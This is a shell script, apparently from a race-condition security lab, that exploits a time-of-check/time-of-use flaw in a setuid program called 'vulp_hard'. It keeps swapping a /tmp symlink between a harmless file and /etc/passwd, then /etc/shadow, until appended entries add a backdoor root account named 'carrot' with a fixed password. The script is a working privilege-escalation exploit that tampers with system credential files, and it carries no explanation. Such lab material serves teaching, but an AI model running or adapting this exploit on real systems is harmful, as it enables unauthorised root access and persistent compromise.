#!/bin/sh


touch /tmp/ZYX
ln -sf /tmp/ZYX /tmp/XYZ

old=`ls -l /etc/passwd`
new=`ls -l /etc/passwd`
while [ "$old" = "$new" ]
do
    ./vulp_hard < passwd_append > /dev/null &
    ln -sf /etc/passwd /tmp/XYZ; ln -sf /tmp/ZYX /tmp/XYZ
    new=`ls -l /etc/passwd`
done

echo "STOP... The /etc/passwd file has been changed"

old=`ls -l /etc/shadow`
new=`ls -l /etc/shadow`
while [ "$old" = "$new" ]
do
    ./vulp_hard < shadow_append > /dev/null &
    ln -sf /etc/shadow /tmp/XYZ; ln -sf /tmp/ZYX /tmp/XYZ
    new=`ls -l /etc/shadow`
done

echo "STOP... The /etc/shadow file has been changed"
echo "#--------------------------#"
echo "# New root user created!   #"
echo "#                          #"
echo "# Username: carrot         #"
echo "# Password: imaredroot     #"
echo "#--------------------------#"

